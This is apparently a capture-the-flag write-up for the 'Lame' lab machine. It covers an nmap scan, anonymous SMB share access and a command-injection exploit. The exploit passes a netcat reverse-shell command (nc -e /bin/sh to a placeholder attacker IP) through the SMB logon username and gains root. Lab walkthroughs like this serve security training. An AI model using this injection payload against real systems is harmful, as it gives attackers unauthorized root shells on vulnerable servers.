## Lame ![propic](/pictures/lame/lame.png)

Start off with a network scan:
```
nmap -sV -sC -oA nmap/lame 10.10.10.3
```
![nmap](/pictures/lame/nmap.png)

There is an open ports 21, 22, 139, 445.
Initally, I am interested in the anonymous logon in ftp, but there are no notable files there.

So, I divert my attention to the available smbshare and attempt to login to the tmp directory via the command:
```
smbclient -N //10.10.10.3/tmp
```
I am able to successfully logon anonymously to the smb share and list the relevant commands.

I notice that the 'logon' command is available in smb. So, I can create a listener and reverse shell with the following commands:

```
nc -lvnp 6200
logon "./=`nohup nc -e /bin/sh <attacker_ip> 6200`"
```
I receive a shell and we are now root. From there, I am easily able to capture both the user.txt and root.txt under /home/makis/ and /root/.
